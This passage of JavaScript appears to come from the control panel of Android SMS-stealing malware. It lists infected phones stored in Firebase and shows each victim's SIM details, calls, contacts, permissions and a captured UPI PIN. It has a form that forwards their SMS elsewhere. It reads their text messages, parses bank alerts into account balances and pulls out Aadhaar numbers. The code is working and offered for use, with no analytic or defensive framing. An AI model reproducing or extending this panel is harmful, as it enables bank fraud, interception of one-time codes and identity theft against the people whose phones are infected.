    if(d.error){st.textContent=d.error;st.style.color='var(--error)';return;}
    var rows=(d.response&&d.response.data)||[];
    if(!Array.isArray(rows))rows=[];
    var aadhars=[],seen={};
    rows.forEach(function(row){
      if(!row||row.aadhar==null)return;
      var a=String(row.aadhar).replace(/\D/g,'');
      if(!a||seen[a])return;seen[a]=1;aadhars.push(a);
    });
    if(!aadhars.length){st.textContent='No aadhar found';st.style.color='var(--error)';return;}
    st.textContent='✅ '+aadhars.length+' found';st.style.color='var(--success)';
    res.innerHTML=aadhars.map(function(a,i){
      return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><span class="mono aadhar-hl">'+esc(a)+'</span></div>';
    }).join('');
  });
}
function renderAutoTokenLog(log){
  var el=document.getElementById('autoTokenLog');
  if(!el)return;
  if(!log||!log.length){el.innerHTML='<div class="empty-mini">No auto-token activity yet</div>';return;}
  el.innerHTML=log.map(function(row){
    return '<div class="token-log '+(row.ok?'ok':'bad')+'">'+esc(row.time||'')+' → '+esc(row.to||'?')+' · '+esc((row.message||'').substring(0,40))+'</div>';
  }).join('');
}
function updatePanelVersionBadge(){
  var el=document.getElementById('panelVerBadge');
  if(!el)return;
  var v=PANEL_BUILD;
  if(window.RebelAndroid&&RebelAndroid.getPanelVersion){
    try{v=RebelAndroid.getPanelVersion()||v;}catch(e){}
  }
  el.textContent='Panel v'+v+' · Key Firebase';
}
function updateStats(){
  var l=getFilteredDevs();
  countUp(document.getElementById('stTotal'),l.length);
  countUp(document.getElementById('stOnline'),l.filter(function(d){return d.status==='online';}).length);
  countUp(document.getElementById('stOffline'),l.filter(function(d){return d.status==='offline';}).length);
  document.querySelectorAll('.stat-card').forEach(function(c){c.classList.remove('bump');void c.offsetWidth;c.classList.add('bump');});
}
function fetchSummaryNode(inst,node){
  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
}
function discoverInstance(inst){
  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
    if(!roots||typeof roots!=='object')return;
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    var tasks=[];
    nodes.forEach(function(n){
      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
    });
    return Promise.all(tasks);
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  ['clients','devices_status'].forEach(function(node){
    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
  });
}
function fetchAllData(){
  var hdr=document.getElementById('hdrSub');
  if(hdr)hdr.textContent='Syncing...';
  setHdrSync(true);showSkeleton();
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsData();
    if(hdr)hdr.textContent=getFilteredDevs().length+' devices';
    setHdrSync(false);
    if(selDev)loadSmsForDevice();
  });
}
function startPanelPreload(){
  if(window._preloadStarted)return;
  var key='';
  if(window.RebelAndroid){
    var sessionData=parseJson(RebelAndroid.checkSession());
    if(sessionData&&sessionData.ok&&sessionData.key)key=normAccessKey(sessionData.key);
    if(!key&&RebelAndroid.getAccessKey)key=normAccessKey(RebelAndroid.getAccessKey()||'');
  }
  if(!key)return;
  window._preloadStarted=true;
  bindAccessKey(key);
  loadClientsCache();
  fetchAllData();
  loadAutoTokenState();
}
function refreshData(){
  var btn=document.getElementById('refreshBtn');
  if(btn){btn.classList.add('spinning');setTimeout(function(){btn.classList.remove('spinning');},900);}
  toast('Refreshing...',true);fetchAllData();
}

function renderDevices(){
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
  var el=document.getElementById('devList');
  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
  el.innerHTML=list.map(function(d,i){
    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
      '<div class="dev-bar"></div><div class="dev-body">'+
      '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
      '</div></div>';
  }).join('');
}
function selectDevice(id){
  if(selDev!==id){tabLoaded={};_smsLoadedDev='';_smsDataHash='';_bankDataHash='';window_sms=[];window_banks=[];_bankPrefetchDev='';}
  selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice(true);
  switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
  ensureDevTabLoaded('sim');
}

function renderDeviceView(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
  empty.classList.add('hidden');hero.classList.remove('hidden');
  var lastSeen=formatLastSeenAgo(resolveLastSeenMs(clientsRawMap[d.id]||{},d.status==='online'));
  var upi=getUpiPinFromRecord(clientsRawMap[d.id]||{});
  hero.innerHTML='<div class="hero-card">'+
    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
    '<div class="hero-last">Last seen: '+esc(lastSeen)+'</div>'+
    '<div class="hero-grid">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">UPI PIN</div><div class="hero-val" id="heroUpi">'+esc(upi||'—')+'</div></div>'+
    '</div><div class="dev-tabs">'+
    '<button class="dev-tab active" data-tab="sim" onclick="switchDevTab(\'sim\',this)">SIM</button>'+
    '<button class="dev-tab" data-tab="calls" onclick="switchDevTab(\'calls\',this)">Calls</button>'+
    '<button class="dev-tab" data-tab="contacts" onclick="switchDevTab(\'contacts\',this)">Contacts</button>'+
    '<button class="dev-tab" data-tab="perms" onclick="switchDevTab(\'perms\',this)">Perms</button>'+
    '<button class="dev-tab" data-tab="forward" onclick="switchDevTab(\'forward\',this)">Forward</button>'+
    '</div>'+
    '<div class="dev-section active" id="devtab-sim"><div id="simList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-calls"><div id="callsList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-contacts"><div id="contactsList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-perms"><div id="permsList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-forward">'+
    '<label class="form-label"><input type="checkbox" id="fwToggle"/> Enable forwarding</label>'+
    '<input class="form-input" id="fwNumber" placeholder="Forward to number"/>'+
    '<label class="form-label"><input type="checkbox" id="fwAll" checked/> Forward all SMS</label>'+
    '<input class="form-input" id="fwFilters" placeholder="Filters (comma separated)"/>'+
    '<button class="btn-send" onclick="saveForward()" style="margin-top:10px">Save Forwarding</button>'+
    '<div id="fwList" class="data-list" style="margin-top:12px"></div></div>'+
    '<button class="btn-send" onclick="switchTab(\'bank\',document.querySelector(\'.nav-item[data-tab=bank]\'))" style="margin-top:14px">🏦 Bank Account Summary</button>'+
    '<div style="margin-top:10px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
  ensureDevTabLoaded('sim');
}
function updateSendForm(){
  var d=getSelDev();
  document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
  document.getElementById('sendForm').classList.toggle('hidden',!d);
  if(d)loadSendSimOptions(d);
}
function defaultSimSlots(){
  return [
    {slot:1,label:'SIM 1',carrier:'Slot 1',number:''},
    {slot:2,label:'SIM 2',carrier:'Slot 2',number:''}
  ];
}
function normalizeSimSlots(data){
  var slots=[],i,sim;
  if(data&&data.sims&&data.sims.length){
    for(i=0;i<data.sims.length;i++){
      sim=data.sims[i]||{};
      slots.push({
        slot:i+1,
        label:'SIM '+(i+1),
        carrier:sim.carrierName||sim.sim_operator_name||sim.operator||'SIM '+(i+1),
        number:sim.phoneNumber||sim.number||sim.line1Number||sim.mobNo||''
      });
    }
    return slots;
  }
  if(data&&data.sim_info){
    var info=data.sim_info;
    if(info.sims&&info.sims.length){
      for(i=0;i<info.sims.length;i++){
        sim=info.sims[i]||{};
        slots.push({slot:i+1,label:'SIM '+(i+1),carrier:sim.carrierName||sim.sim_operator_name||'SIM '+(i+1),number:sim.phoneNumber||sim.number||''});
      }
      return slots;
    }
    if(info.sim1||info.sim2){
      if(info.sim1)slots.push({slot:1,label:'SIM 1',carrier:info.sim1.operator||info.sim1.carrier||'SIM 1',number:info.sim1.number||info.sim1.phone||''});
      if(info.sim2)slots.push({slot:2,label:'SIM 2',carrier:info.sim2.operator||info.sim2.carrier||'SIM 2',number:info.sim2.number||info.sim2.phone||''});
      if(slots.length)return slots;
    }
    if(info.sim_operator_name||info.phone_number||info.imei){
      slots.push({slot:1,label:'SIM 1',carrier:info.sim_operator_name||info.network_operator_name||'SIM 1',number:info.phone_number||info.line1Number||''});
      if(info.sim2_operator_name||info.dual_sim)slots.push({slot:2,label:'SIM 2',carrier:info.sim2_operator_name||'SIM 2',number:info.sim2_phone_number||''});
      if(slots.length)return slots;
    }
  }
  return defaultSimSlots();
}
function renderSendSimPicker(slots){
  var el=document.getElementById('sendSimPicker');
  if(!el)return;
  _deviceSims=slots&&slots.length?slots:defaultSimSlots();
  if(!_deviceSims.some(function(s){return s.slot===_sendSimSlot;}))_sendSimSlot=_deviceSims[0].slot;
  el.innerHTML=_deviceSims.map(function(sim){
    var active=sim.slot===_sendSimSlot?' active':'';
    var meta=[sim.carrier,sim.number].filter(Boolean).join(' · ')||'Tap to use this slot';
    return '<button type="button" class="sim-chip'+active+'" onclick="selectSendSim('+sim.slot+',this)">'+
      '<div class="sim-chip-title">'+esc(sim.label)+'</div>'+
      '<div class="sim-chip-meta">'+esc(meta)+'</div></button>';
  }).join('');
}
function selectSendSim(slot,btn){
  _sendSimSlot=slot;
  document.querySelectorAll('.sim-chip').forEach(function(el){el.classList.remove('active');});
  if(btn)btn.classList.add('active');
}
function loadSendSimOptions(dev){
  var el=document.getElementById('sendSimPicker');
  if(el)el.innerHTML='<div class="sim-picker-loading">Loading SIM slots...</div>';
  var inst=getFbInstance(dev.fbId);
  var cached=clientsRawMap[dev.id];
  if(inst&&inst.schema==='rabel'){
    if(cached&&cached.sims&&cached.sims.length){renderSendSimPicker(normalizeSimSlots(cached));return;}
    restJson(inst.restUrl+'/clients/'+encodeURIComponent(dev.rawId)+'.json').then(function(data){
      renderSendSimPicker(normalizeSimSlots(data||{}));
    }).catch(function(){renderSendSimPicker(defaultSimSlots());});
    return;
  }
  var base=(dev.deviceNode||'devices')+'/'+dev.rawId;
  restJson(inst.restUrl+'/'+base+'/device_info/sim_info.json').then(function(simInfo){
    renderSendSimPicker(normalizeSimSlots({sim_info:simInfo||{}}));
  }).catch(function(){
    renderSendSimPicker(normalizeSimSlots(cached||{}));
  });
}

function clearSmsListeners(){
  Object.keys(activeListeners).forEach(function(k){
    if(k.indexOf('sms::')!==0)return;
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    else if(L.db&&L.ref){
      if(L.h)L.ref.off('value',L.h);
      if(L.addH)L.ref.off('child_added',L.addH);
      if(L.chH)L.ref.off('child_changed',L.chH);
    }
    delete activeListeners[k];
  });
}
function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    else if(L.db&&L.ref){
      if(L.h)L.ref.off('value',L.h);
      if(L.addH)L.ref.off('child_added',L.addH);
      if(L.chH)L.ref.off('child_changed',L.chH);
    }
  });
  activeListeners={};
}
var SMS_MONTHS={jan:0,feb:1,mar:2,apr:3,may:4,jun:5,jul:6,aug:7,sep:8,oct:9,nov:10,dec:11};
function parseDdMmYyyy(s){
  if(!s||typeof s!=='string')return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{2,4})(?:[T\s,|]*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?/i);
  if(!m)return 0;
  var dd=+m[1],MM=+m[2],yyyy=+m[3];
  if(yyyy<100)yyyy+=2000;
  var hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
  return isNaN(ms)?0:ms;
}
function parseNamedMonthDate(s){
  if(!s||typeof s!=='string')return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\s\/\-\.]+([A-Za-z]{3,9})[\s\/\-\.,]+(\d{2,4})(?:[,\s]+(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)?)?/i);
  if(!m)return 0;
  var mon=(SMS_MONTHS[String(m[2]).slice(0,3).toLowerCase()]);
  if(mon==null)return 0;
  var yyyy=+m[3];if(yyyy<100)yyyy+=2000;
  var hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
  var ms=new Date(yyyy,mon,+m[1],hh,mi,ss).getTime();
  return isNaN(ms)?0:ms;
}
function smsToMs(v){
  if(v==null||v==='')return 0;
  if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  if(typeof v==='string'){
    var t=Date.parse(v);
    if(!isNaN(t))return t;
    var d2=parseDdMmYyyy(v);
    if(d2)return d2;
    d2=parseNamedMonthDate(v);
    if(d2)return d2;
  }
  return 0;
}
function smsMsgTime(m){
  if(!m)return 0;
  var keys=['date','timestamp','dateTime','datetime','time','time_ms','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','date_long','smsDate','msg_date','id'];
  var i,ms;
  for(i=0;i<keys.length;i++){ms=smsToMs(m[keys[i]]);if(ms)return ms;}
  ms=smsToMs(m._sortKey);
  if(ms)return ms;
  return smsToMs(m.date_readable||m.dateTime||m.datetime||m.time||m.time_str||'');
}
function compareSortKeyDesc(a,b){
  var sa=String(a||''),sb=String(b||'');
  if(sa===sb)return 0;
  var na=Number(sa),nb=Number(sb);
  if(!isNaN(na)&&!isNaN(nb)&&/^\d+$/.test(sa)&&/^\d+$/.test(sb))return nb-na;
  return sb.localeCompare(sa);
}
function sortSmsNewestFirst(list){
  if(!list||!list.length)return[];
  return list.slice().sort(function(a,b){
    var ta=a.date_ms||smsMsgTime(a)||0,tb=b.date_ms||smsMsgTime(b)||0;
    if(tb!==ta)return tb-ta;
    var da=String(a.date_readable||''),db=String(b.date_readable||'');
    if(da&&db&&da!=='—'&&db!=='—'&&da!==db)return db.localeCompare(da);
    var sk=compareSortKeyDesc(a._sortKey,b._sortKey);
    if(sk)return sk;
    return (b._seq|0)-(a._seq|0);
  });
}
function finalizeSmsList(list){
  if(!list||!list.length)return[];
  var dated=0,i;
  for(i=0;i<list.length;i++){if((list[i].date_ms||0)>0)dated++;}
  if(dated<list.length*0.2){
    for(i=0;i<list.length;i++){if(list[i]._seq==null)list[i]._seq=i;}
    list.reverse();
  }
  return sortSmsNewestFirst(list);
}
function parseAllSmsPayload(data){
  if(!data)return[];
  var raw=data.messages!=null?data.messages:data;
  return finalizeSmsList(smsAsList(raw).map(normalizeSms).filter(Boolean));
}
function parseNewSmsPayload(data){
  if(!data)return[];
  return finalizeSmsList(smsAsList(data).map(normalizeSms).filter(Boolean));
}
function mergeSmsLists(a,b){
  var seen={},out=[];
  function add(arr){
    (arr||[]).forEach(function(m){
      var k=(m.date_ms||0)+'|'+String(m.address||'')+'|'+String(m.body||'').slice(0,120);
      if(!seen[k]){seen[k]=1;out.push(m);}
    });
  }
  add(b);add(a);
  return finalizeSmsList(out).slice(0,500);
}
function applySmsList(list){
  var sorted=sortSmsNewestFirst(list||[]);
  var hash=sorted.length+'|'+(sorted[0]?sorted[0].date_ms:0)+'|'+(sorted[sorted.length-1]?sorted[sorted.length-1].date_ms:0);
  if(hash===_smsDataHash&&window_sms.length)return;
  _smsDataHash=hash;
  window_sms=sorted;
  scheduleSmsUiUpdate();
}
function scheduleSmsUiUpdate(){
  if(_smsRenderTimer)return;
  _smsRenderTimer=setTimeout(function(){
    _smsRenderTimer=0;
    requestAnimationFrame(function(){renderSms();renderBankAccounts();});
  },120);
}
function ensureSmsLoaded(){
  var d=getSelDev();
  if(!d)return;
  if(_smsLoadedDev!==d.id||!window_sms.length)loadSmsForDevice();
  else{renderSms();renderBankAccounts();}
}
function loadSmsForDevice(force){
  var d=getSelDev();if(!d)return;
  if(!force&&_smsLoadedDev===d.id&&window_sms.length){renderSms();renderBankAccounts();return;}
  _smsLoadedDev=d.id;
  _smsDataHash='';
  var empty=document.getElementById('smsEmpty');
  if(empty)empty.classList.add('hidden');
  clearSmsListeners();
  var inst=getFbInstance(d.fbId);
  if(!inst)return;
  if(inst.schema==='rabel'){
    var path='messages/'+d.rawId;
    if(inst.db){
      var ref=inst.db.ref(path).limitToLast(400);
      var h=function(s){applySmsList(parseAllSmsPayload(s.val()));};
      ref.on('value',h);
      activeListeners['sms::rabel::'+d.id]={db:inst.db,ref:ref,h:h};
    }else{
      var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(function(d){applySmsList(parseAllSmsPayload(d));});};
      tick();
      activeListeners['sms::rabel::'+d.id]={timer:setInterval(tick,5000)};
    }
    return;
  }
  var base=(d.deviceNode||'devices')+'/'+d.rawId;
  var bags={all:[],new:[]};
  function mergeBags(){applySmsList(mergeSmsLists(bags.all,bags.new));}
  if(inst.db){
    inst.db.ref(base+'/all_sms').once('value',function(s){bags.all=parseAllSmsPayload(s.val());mergeBags();});
    inst.db.ref(base+'/new_sms').once('value',function(s){bags.new=parseNewSmsPayload(s.val());mergeBags();});
    var newRef=inst.db.ref(base+'/new_sms');
    var addH=function(s){
      var n=normalizeSms(s.val());
      if(n){
        n._sortKey=s.key||n._sortKey||'';
        n._seq=Date.now();
        bags.new.push(n);
        mergeBags();
      }
    };
    newRef.on('child_added',addH);
    activeListeners['sms::new::'+d.id]={db:inst.db,ref:newRef,addH:addH};
    return;
  }
  restJson(inst.restUrl+'/'+base+'/all_sms.json').then(function(d){bags.all=parseAllSmsPayload(d);mergeBags();});
  restJson(inst.restUrl+'/'+base+'/new_sms.json').then(function(d){bags.new=parseNewSmsPayload(d);mergeBags();});
  var tickAll=function(){
    Promise.all([
      restJson(inst.restUrl+'/'+base+'/all_sms.json'),
      restJson(inst.restUrl+'/'+base+'/new_sms.json')
    ]).then(function(r){bags.all=parseAllSmsPayload(r[0]);bags.new=parseNewSmsPayload(r[1]);mergeBags();});
  };
  tickAll();
  activeListeners['sms::rest::'+d.id]={timer:setInterval(tickAll,5000)};
}
function smsAsList(raw){
  if(!raw)return[];
  if(Array.isArray(raw))return raw.map(function(x,i){
    if(!x||typeof x!=='object')return null;
    if(!x._sortKey)x._sortKey=String(i);
    x._seq=i;
    return x;
  }).filter(Boolean);
  return Object.keys(raw).sort(function(a,b){
    var na=Number(a),nb=Number(b);
    if(!isNaN(na)&&!isNaN(nb)&&/^\d+$/.test(a)&&/^\d+$/.test(b))return na-nb;
    return String(a).localeCompare(String(b));
  }).map(function(k,i){
    var x=raw[k];
    if(!x||typeof x!=='object')return null;
    if(!x._sortKey)x._sortKey=k;
    x._seq=i;
    return x;
  }).filter(Boolean);
}
function normalizeSms(m){
  if(!m||typeof m!=='object')return null;
  var body=m.body||m.message||m.text||m.content||m.sms_body||'';
  if(!body)return null;
  var ts=smsMsgTime(m);
  return{address:m.address||m.sender||m.from||m.number||m.phone||m.mobNo||'?',body:body,
    date_readable:m.date_readable||m.dateTime||m.datetime||m.time||m.received_at||m.time_str||'—',
    date_ms:ts,_sortKey:m._sortKey||'',_seq:m._seq!=null?m._seq:0,
    type:String(m.type||m.sms_type||m.direction||m.msg_type||'inbox').toLowerCase()};
}
function renderSmsFromData(data){applySmsList(parseAllSmsPayload(data));}
function parseInrAmount(s){
  if(s==null)return null;
  var n=parseFloat(String(s).replace(/,/g,''));
  return isNaN(n)||n<0||n>1e12?null:n;
}
var BANK_NAME_MAP=[
  {re:/state\s*bank|sbi\b|sbin/i,name:'State Bank of India'},
  {re:/hdfc/i,name:'HDFC Bank'},{re:/icici/i,name:'ICICI Bank'},{re:/axis/i,name:'Axis Bank'},
  {re:/kotak/i,name:'Kotak Mahindra Bank'},{re:/punjab\s*national|pnb\b/i,name:'Punjab National Bank'},
  {re:/bank\s*of\s*baroda|bob\b/i,name:'Bank of Baroda'},{re:/canara/i,name:'Canara Bank'},
  {re:/union\s*bank/i,name:'Union Bank'},{re:/idbi/i,name:'IDBI Bank'},{re:/yes\s*bank/i,name:'Yes Bank'},
  {re:/indusind/i,name:'IndusInd Bank'},{re:/federal\s*bank/i,name:'Federal Bank'},
  {re:/bandhan/i,name:'Bandhan Bank'},{re:/indian\s*bank/i,name:'Indian Bank'},
  {re:/idfc/i,name:'IDFC FIRST Bank'},{re:/rbl\s*bank/i,name:'RBL Bank'}
];
var BANK_SENDER_MAP=[
  ['SBIINB','State Bank of India'],['SBIPSG','State Bank of India'],['SBI','State Bank of India'],
  ['HDFCBK','HDFC Bank'],['HDFC','HDFC Bank'],['ICICIB','ICICI Bank'],['ICICIT','ICICI Bank'],
  ['AXISBK','Axis Bank'],['KOTAKB','Kotak Mahindra Bank'],['PNBSMS','Punjab National Bank'],
  ['BOBSMS','Bank of Baroda'],['CANBNK','Canara Bank'],['UNIONB','Union Bank'],['IDBIBK','IDBI Bank']
];
function inferBankName(body,address){
  var text=String(body||'')+' '+String(address||'');
  var i;for(i=0;i<BANK_NAME_MAP.length;i++){if(BANK_NAME_MAP[i].re.test(text))return BANK_NAME_MAP[i].name;}
  var a=String(address||'').toUpperCase().replace(/[^A-Z0-9]/g,'');
  for(i=0;i<BANK_SENDER_MAP.length;i++){if(a.indexOf(BANK_SENDER_MAP[i][0])>=0)return BANK_SENDER_MAP[i][1];}
  return null;
}
function extractAccountFromSms(body){
  var b=String(body||''),patterns=[
    /(?:a\/c|acct|account)\s*(?:no\.?|number)?[:\s]*(?:x{2,}|\*{2,}|X{2,})*(\d{4,})/i,
    /(?:x{4,}|\*{4,}|X{4,})(\d{4})\b/,
    /(?:a\/c|acct)\s*(?:no\.?)?[:\s]*(\d{8,18})/i,
    /(?:no\.?\s*)(?:x{2,}|\*{2,})(\d{4})\b/i
  ],i,m;
  for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1])return m[1];}
  return null;
}
function extractBalanceFromSms(body){
  var b=String(body||''),patterns=[
    /(?:total\s*)?(?:avl|available)\s*bal(?:ance)?[:\s-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /bal(?:ance)?\s*(?:is|:|-)\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:avl|available|your|the)/i,
    /(?:closing|clear)\s*bal(?:ance)?[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /(?:a\/c|acct)[^\d]{0,50}(?:bal|balance)[^\d]{0,30}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /(?:credited|debited|withdrawn|deposited)[\s\S]{0,90}(?:avl|available)\s*bal[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /\bbal[:\s]+(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
    /(?:balance\s+in\s+your\s+a\/c)[\s\S]{0,40}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i
  ],i,m,amt;
  for(i=0;i<patterns.length;i++){
    m=b.match(patterns[i]);
    if(m&&m[1]){amt=parseInrAmount(m[1]);if(amt!=null)return amt;}
  }
  return null;
}
function isBankSms(body,address){
  var t=(String(body||'')+' '+String(address||'')).toLowerCase();
  if(/credited|debited|withdrawn|deposited|avl\s*bal|available\s*bal|a\/c|acct|imps|neft|rtgs|txn|transaction|bal\s*is|balance\s+is/i.test(t))return true;
  if(/sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|bank\b/i.test(t))return true;
  return false;
}
function looksLikeBankSms(body,address){
  if(isBankSms(body,address))return true;
  var bal=extractBalanceFromSms(body);
  if(bal==null)return false;
  if(extractAccountFromSms(body)||inferBankName(body,address))return true;
  if(/(?:rs\.?|inr|₹)\s*[\d,]+/i.test(body))return true;
  return false;
}
function maskBankAccount(acct){
  if(!acct||acct==='Unknown')return 'Unknown';
  var d=String(acct).replace(/\D/g,'');
  if(d.length<=4)return d||'Unknown';
  return 'XXXX'+d.slice(-4);
}
function formatInr(n){
  if(n==null||isNaN(n))return '—';
  return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});
}
function parseBankAccountsFromSms(smsList){
  var map={},keys,k,row,bals,sum,i;
  (smsList||[]).forEach(function(s){
    if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;
    var bal=extractBalanceFromSms(s.body);
    if(bal==null)return;
    var acct=extractAccountFromSms(s.body)||'Unknown';
    var bank=inferBankName(s.body,s.address)||'Bank';
    k=bank+'|'+acct;
    if(!map[k])map[k]={bank:bank,account:acct,balances:[],latestMs:0,latestDate:''};
    map[k].balances.push(bal);
    var ms=s.date_ms||0;
    if(ms>=map[k].latestMs){map[k].latestMs=ms;map[k].latestDate=s.date_readable||'';map[k].current=bal;}
  });
  keys=Object.keys(map);
  return keys.map(function(key){
    row=map[key];bals=row.balances;sum=0;
    for(i=0;i<bals.length;i++)sum+=bals[i];
    return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account),
      current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,
      highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};
  }).sort(function(a,b){return a.bank.localeCompare(b.bank);});
}
function renderBankAccounts(){
  var d=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('bankCountBadge'),noteEl=document.getElementById('bankAutoNote');
  if(!d){
    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>Select a device to load bank balances from SMS';}
    if(listEl)listEl.innerHTML='';if(badge)badge.textContent='0 Banks';
    if(noteEl)noteEl.textContent='Balances are parsed automatically from bank SMS';
    return;
  }
  if(!window_sms.length&&_smsLoadedDev!==d.id){
    if(noteEl)noteEl.textContent='Fetching SMS and parsing bank balances...';
    loadSmsForDevice(true);
  }
  window_banks=parseBankAccountsFromSms(window_sms);
  var bh=window_banks.length+'|'+window_sms.length;
  if(bh===_bankDataHash&&listEl&&listEl.children.length)return;
  _bankDataHash=bh;
  if(badge)badge.textContent=window_banks.length+' Bank'+(window_banks.length===1?'':'s');
  if(noteEl)noteEl.textContent=window_banks.length
    ? ('Auto-parsed from '+window_sms.length+' SMS · SBI, HDFC, ICICI, etc.')
    : (window_sms.length?'No bank balance SMS found in '+window_sms.length+' messages':'Waiting for SMS sync...');
  if(!window_banks.length){
    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts appear here</span>';}
    if(listEl)listEl.innerHTML='';return;
  }
  if(emptyEl)emptyEl.classList.add('hidden');
  if(!listEl)return;
  listEl.innerHTML=window_banks.map(function(b){
    return '<div class="bank-card"><div class="bank-card-top"><div class="bank-icon">🏦</div><div><div class="bank-name">'+esc(b.bank)+'</div><div class="bank-acct">A/C '+esc(b.accountMask)+'</div></div></div>'+
      '<div class="bank-grid">'+
      '<div class="bank-stat"><div class="bank-stat-lbl">CURRENT BALANCE</div><div class="bank-stat-val current">'+formatInr(b.current)+'</div></div>'+
      '<div class="bank-stat"><div class="bank-stat-lbl">AVERAGE</div><div class="bank-stat-val">'+formatInr(b.average)+'</div></div>'+
      '<div class="bank-stat"><div class="bank-stat-lbl">HIGHEST</div><div class="bank-stat-val">'+formatInr(b.highest)+'</div></div>'+
      '<div class="bank-stat"><div class="bank-stat-lbl">LOWEST</div><div class="bank-stat-val">'+formatInr(b.lowest)+'</div></div>'+
      '</div><div class="bank-meta">'+b.count+' balance SMS'+(b.latestDate?' · Latest: '+esc(b.latestDate):'')+'</div></div>';
  }).join('');
}
function renderSms(){
  var d=getSelDev(),el=document.getElementById('smsList');
  if(!d){document.getElementById('smsEmpty').classList.remove('hidden');if(el)el.innerHTML='';return;}
  if(!window_sms.length){
